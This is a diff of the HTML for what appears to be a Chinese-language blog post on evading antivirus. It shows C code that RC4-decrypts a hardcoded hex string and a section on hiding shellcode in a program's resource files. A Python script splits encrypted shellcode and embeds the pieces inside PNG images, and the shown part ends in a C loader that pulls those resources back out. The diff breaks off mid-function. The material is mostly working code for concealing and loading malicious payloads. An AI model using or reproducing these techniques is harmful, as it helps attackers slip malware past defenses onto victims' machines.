-		<span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">;</span>
-		<span class="n">t</span> <span class="o">=</span> <span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
-		<span class="n">Data</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">^=</span> <span class="n">s</span><span class="p">[</span><span class="n">t</span><span class="p">];</span>
-	<span class="p">}</span>
-<span class="p">}</span>
-<span class="n">VOID</span> <span class="nf">StrToByte</span><span class="p">(</span><span class="n">CHAR</span><span class="o">*</span> <span class="n">Result</span><span class="p">,</span> <span class="n">CHAR</span><span class="o">*</span> <span class="n">Src</span><span class="p">,</span> <span class="n">INT</span> <span class="n">nLen</span><span class="p">)</span>
-<span class="p">{</span>
-	<span class="n">CHAR</span> <span class="n">h1</span><span class="p">,</span> <span class="n">h2</span><span class="p">;</span>
-	<span class="n">CHAR</span> <span class="n">s1</span><span class="p">,</span> <span class="n">s2</span><span class="p">;</span>
-	<span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
-	<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">nLen</span> <span class="o">/</span> <span class="mi">2</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
-	<span class="p">{</span>
-		<span class="n">h1</span> <span class="o">=</span> <span class="n">Src</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">i</span><span class="p">];</span>
-		<span class="n">h2</span> <span class="o">=</span> <span class="n">Src</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
-		<span class="n">s1</span> <span class="o">=</span> <span class="n">toupper</span><span class="p">(</span><span class="n">h1</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x30</span><span class="p">;</span>
-		<span class="k">if</span> <span class="p">(</span><span class="n">s1</span> <span class="o">&gt;</span> <span class="mi">9</span><span class="p">)</span>
-			<span class="n">s1</span> <span class="o">-=</span> <span class="mi">7</span><span class="p">;</span>
-
-		<span class="n">s2</span> <span class="o">=</span> <span class="n">toupper</span><span class="p">(</span><span class="n">h2</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x30</span><span class="p">;</span>
-		<span class="k">if</span> <span class="p">(</span><span class="n">s2</span> <span class="o">&gt;</span> <span class="mi">9</span><span class="p">)</span>
-			<span class="n">s2</span> <span class="o">-=</span> <span class="mi">7</span><span class="p">;</span>
-
-		<span class="n">Result</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">s1</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="n">s2</span><span class="p">;</span>
-	<span class="p">}</span>
-<span class="p">}</span>
-<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
-	<span class="n">CHAR</span> <span class="n">Result</span><span class="p">[</span><span class="mi">50</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
-	<span class="c1">//以16进制形式加密存储的字符串
-</span><span class="c1"></span>	<span class="n">CHAR</span> <span class="n">data</span><span class="p">[]</span><span class="o">=</span><span class="s">&#34;eef725647574cc48fa4dd3f927932e70b152&#34;</span><span class="p">;</span>
-	<span class="c1">//此函数将16进制字符串还原成RC4加密后的字节
-</span><span class="c1"></span>	<span class="n">StrToByte</span><span class="p">(</span><span class="n">Result</span><span class="p">,</span><span class="n">data</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">data</span><span class="p">));</span>
-	<span class="c1">//密钥不变
-</span><span class="c1"></span>	<span class="n">CHAR</span> <span class="n">key</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&#34;DsbNrQ01WT9Py5RkPT8P&#34;</span><span class="p">;</span>
-	<span class="n">BYTE</span> <span class="n">s</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
-	<span class="c1">//初始化数组
-</span><span class="c1"></span>	<span class="n">RC4Init</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">key</span><span class="p">));</span>
-	<span class="c1">//解密
-</span><span class="c1"></span>	<span class="n">RC4Encrypt</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="n">Result</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">Result</span><span class="p">));</span>
-	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">Result</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">VOID</span> <span class="nf">RC4Init</span><span class="p">(</span><span class="n">BYTE</span><span class="o">*</span> <span class="n">s</span><span class="p">,</span> <span class="n">CHAR</span><span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="n">INT</span> <span class="n">Len</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">BYTE</span> <span class="n">k</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl">	<span class="n">BYTE</span> <span class="n">tmp</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="n">k</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">Len</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">k</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="n">tmp</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">		<span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">		<span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">VOID</span> <span class="nf">RC4Encrypt</span><span class="p">(</span><span class="n">BYTE</span><span class="o">*</span> <span class="n">s</span><span class="p">,</span> <span class="n">CHAR</span><span class="o">*</span> <span class="n">Data</span><span class="p">,</span> <span class="n">INT</span> <span class="n">Len</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">t</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">BYTE</span> <span class="n">tmp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">Len</span><span class="p">;</span> <span class="n">k</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="n">tmp</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">		<span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">		<span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="n">t</span> <span class="o">=</span> <span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="n">Data</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">^=</span> <span class="n">s</span><span class="p">[</span><span class="n">t</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">VOID</span> <span class="nf">StrToByte</span><span class="p">(</span><span class="n">CHAR</span><span class="o">*</span> <span class="n">Result</span><span class="p">,</span> <span class="n">CHAR</span><span class="o">*</span> <span class="n">Src</span><span class="p">,</span> <span class="n">INT</span> <span class="n">nLen</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">CHAR</span> <span class="n">h1</span><span class="p">,</span> <span class="n">h2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">CHAR</span> <span class="n">s1</span><span class="p">,</span> <span class="n">s2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">nLen</span> <span class="o">/</span> <span class="mi">2</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="n">h1</span> <span class="o">=</span> <span class="n">Src</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">i</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">		<span class="n">h2</span> <span class="o">=</span> <span class="n">Src</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">		<span class="n">s1</span> <span class="o">=</span> <span class="n">toupper</span><span class="p">(</span><span class="n">h1</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x30</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">s1</span> <span class="o">&gt;</span> <span class="mi">9</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="n">s1</span> <span class="o">-=</span> <span class="mi">7</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="n">s2</span> <span class="o">=</span> <span class="n">toupper</span><span class="p">(</span><span class="n">h2</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x30</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">s2</span> <span class="o">&gt;</span> <span class="mi">9</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="n">s2</span> <span class="o">-=</span> <span class="mi">7</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="n">Result</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">s1</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="n">s2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">CHAR</span> <span class="n">Result</span><span class="p">[</span><span class="mi">50</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//以16进制形式加密存储的字符串
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">CHAR</span> <span class="n">data</span><span class="p">[]</span><span class="o">=</span><span class="s">&#34;eef725647574cc48fa4dd3f927932e70b152&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//此函数将16进制字符串还原成RC4加密后的字节
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">StrToByte</span><span class="p">(</span><span class="n">Result</span><span class="p">,</span><span class="n">data</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">data</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//密钥不变
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">CHAR</span> <span class="n">key</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&#34;DsbNrQ01WT9Py5RkPT8P&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">BYTE</span> <span class="n">s</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//初始化数组
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">RC4Init</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">key</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//解密
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">RC4Encrypt</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="n">Result</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">Result</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">Result</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h2 id="利用资源文件隐藏-shellcode"><a href="#利用资源文件隐藏-shellcode" class="anchor-link">#</a><a href="#contents:利用资源文件隐藏-shellcode" class="headings">利用资源文件隐藏 Shellcode</a></h2>
 <p>隐藏 shellcode的方法常见的有两种: 放在服务器上远程下载或者放在本地。远程下载不必多说，有各种Windows API支持。本地存储shellcode也有两种方法: 一个是加密成一个文件，单独存放。一种是打包在PE的资源文件中。前者会多出一个文件，不利于部署。存储在资源文件中相对来说比较方便。</p>
@@ -625,29 +625,29 @@
 </span><span class="lnt">22
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1">#coding:utf-8</span>
-<span class="kn">import</span> <span class="nn">os</span>
-<span class="kn">import</span> <span class="nn">sys</span>
-<span class="n">shellcodePath</span><span class="o">=</span><span class="s2">&#34;encrypt.bin&#34;</span> <span class="c1">#rc4加密后的shellcode</span>
-<span class="n">pngPath</span><span class="o">=</span><span class="s2">&#34;xx.png&#34;</span> <span class="c1">#正常图片，不宜过大。</span>
-<span class="k">def</span> <span class="nf">echoPng</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span><span class="n">num</span><span class="p">):</span>
-    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">pngPath</span><span class="p">,</span><span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f1</span><span class="p">:</span>
-        <span class="n">png</span><span class="o">=</span><span class="n">f1</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-        <span class="n">png1</span><span class="o">=</span><span class="n">png</span><span class="p">[:</span><span class="mi">300</span><span class="p">]</span>
-        <span class="n">png2</span><span class="o">=</span><span class="n">png1</span><span class="o">+</span><span class="n">shellcode</span>
-        <span class="n">png3</span><span class="o">=</span><span class="n">png</span><span class="p">[</span><span class="mi">300</span><span class="p">:]</span>
-        <span class="n">pngAll</span><span class="o">=</span><span class="n">png2</span><span class="o">+</span><span class="n">png3</span>
-        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;ico</span><span class="si">{0}</span><span class="s2">.png&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">num</span><span class="p">),</span><span class="s2">&#34;wb+&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f2</span><span class="p">:</span>
-            <span class="n">f2</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">pngAll</span><span class="p">)</span>
-
-<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">shellcodePath</span><span class="p">,</span><span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-		<span class="c1">#拆分shellcode成两块，并插入到文件中。</span>
-    <span class="n">shellcode</span><span class="o">=</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-    <span class="n">shellcode1</span><span class="o">=</span><span class="n">shellcode</span><span class="p">[:</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span><span class="p">]</span>
-    <span class="n">shellcode2</span><span class="o">=</span><span class="n">shellcode</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span><span class="p">:]</span>
-    <span class="n">echoPng</span><span class="p">(</span><span class="n">shellcode1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
-    <span class="n">echoPng</span><span class="p">(</span><span class="n">shellcode2</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#coding:utf-8</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcodePath</span><span class="o">=</span><span class="s2">&#34;encrypt.bin&#34;</span> <span class="c1">#rc4加密后的shellcode</span>
+</span></span><span class="line"><span class="cl"><span class="n">pngPath</span><span class="o">=</span><span class="s2">&#34;xx.png&#34;</span> <span class="c1">#正常图片，不宜过大。</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">echoPng</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span><span class="n">num</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">pngPath</span><span class="p">,</span><span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">png</span><span class="o">=</span><span class="n">f1</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">png1</span><span class="o">=</span><span class="n">png</span><span class="p">[:</span><span class="mi">300</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">png2</span><span class="o">=</span><span class="n">png1</span><span class="o">+</span><span class="n">shellcode</span>
+</span></span><span class="line"><span class="cl">        <span class="n">png3</span><span class="o">=</span><span class="n">png</span><span class="p">[</span><span class="mi">300</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pngAll</span><span class="o">=</span><span class="n">png2</span><span class="o">+</span><span class="n">png3</span>
+</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;ico</span><span class="si">{0}</span><span class="s2">.png&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">num</span><span class="p">),</span><span class="s2">&#34;wb+&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f2</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">f2</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">pngAll</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">shellcodePath</span><span class="p">,</span><span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">#拆分shellcode成两块，并插入到文件中。</span>
+</span></span><span class="line"><span class="cl">    <span class="n">shellcode</span><span class="o">=</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">shellcode1</span><span class="o">=</span><span class="n">shellcode</span><span class="p">[:</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">shellcode2</span><span class="o">=</span><span class="n">shellcode</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">echoPng</span><span class="p">(</span><span class="n">shellcode1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">echoPng</span><span class="p">(</span><span class="n">shellcode2</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div></li>
 <li>
@@ -693,43 +693,43 @@
 </span><span class="lnt">36
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span><span class="cp"></span>
-<span class="cp">#define imgLen 1000 </span><span class="c1">//此处定义原始图片长度
-</span><span class="c1"></span>
-<span class="n">BYTE</span><span class="o">*</span> <span class="nf">getResource</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span> <span class="n">INT</span> <span class="n">num</span><span class="p">,</span> <span class="n">DWORD</span><span class="o">*</span> <span class="n">PartLen</span><span class="p">)</span> <span class="p">{</span>
-	<span class="n">HRSRC</span> <span class="n">ResInfo</span> <span class="o">=</span> <span class="n">FindResourceW</span><span class="p">(</span><span class="n">hModule</span><span class="p">,</span> <span class="n">MAKEINTRESOURCE</span><span class="p">(</span><span class="n">num</span><span class="p">),</span> <span class="sa">L</span><span class="s">&#34;PNG&#34;</span><span class="p">);</span>
-	<span class="k">if</span> <span class="p">(</span><span class="nb">NULL</span> <span class="o">==</span> <span class="n">ResInfo</span><span class="p">)</span> <span class="p">{</span> <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span>
-	<span class="n">HGLOBAL</span> <span class="n">ResData</span> <span class="o">=</span> <span class="n">LoadResource</span><span class="p">(</span><span class="n">hModule</span><span class="p">,</span> <span class="n">ResInfo</span><span class="p">);</span>
-	<span class="k">if</span> <span class="p">(</span><span class="mi">0</span> <span class="o">==</span> <span class="n">ResData</span><span class="p">)</span> <span class="p">{</span> <span class="n">ExitProcess</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span>
-	<span class="n">LPVOID</span> <span class="n">lpResData</span> <span class="o">=</span> <span class="n">LockResource</span><span class="p">(</span><span class="n">ResData</span><span class="p">);</span>
-	<span class="n">DWORD</span> <span class="n">ResSize</span> <span class="o">=</span> <span class="n">SizeofResource</span><span class="p">(</span><span class="n">hModule</span><span class="p">,</span> <span class="n">ResInfo</span><span class="p">);</span>
-
-	<span class="n">BYTE</span><span class="o">*</span> <span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">calloc</span><span class="p">(</span><span class="n">ResSize</span> <span class="o">-</span> <span class="mi">300</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
-	<span class="k">if</span> <span class="p">(</span><span class="n">data</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span> <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span>
-	<span class="n">memcpy</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">lpResData</span> <span class="o">+</span> <span class="mi">300</span><span class="p">,</span> <span class="n">ResSize</span> <span class="o">-</span> <span class="mi">300</span><span class="p">);</span> <span class="c1">//这里的300 要对应python 文件中的大小
-</span><span class="c1"></span>	<span class="n">BYTE</span><span class="o">*</span> <span class="n">data2</span> <span class="o">=</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">calloc</span><span class="p">(</span><span class="n">ResSize</span> <span class="o">-</span> <span class="n">imgLen</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
-	<span class="k">if</span> <span class="p">(</span><span class="n">data2</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span> <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span>
-	<span class="n">memcpy</span><span class="p">(</span><span class="n">data2</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">data</span><span class="p">,</span> <span class="n">ResSize</span> <span class="o">-</span> <span class="n">imgLen</span><span class="p">);</span>
-	<span class="o">*</span><span class="n">PartLen</span> <span class="o">=</span> <span class="n">ResSize</span> <span class="o">-</span> <span class="n">imgLen</span><span class="p">;</span>
-	<span class="k">return</span> <span class="n">data2</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="kt">int</span> <span class="n">WINAPI</span> <span class="nf">WinMain</span><span class="p">(</span><span class="n">HINSTANCE</span> <span class="n">hInstance</span><span class="p">,</span><span class="n">HINSTANCE</span> <span class="n">hPrevInstance</span><span class="p">,</span><span class="n">LPSTR</span> <span class="n">lpCmdLine</span><span class="p">,</span><span class="kt">int</span> <span class="n">nShowCmd</span><span class="p">)</span> <span class="p">{</span>
-	<span class="n">DWORD</span> <span class="n">Part1Len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">Part2Len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-	<span class="c1">//通过序号读取资源
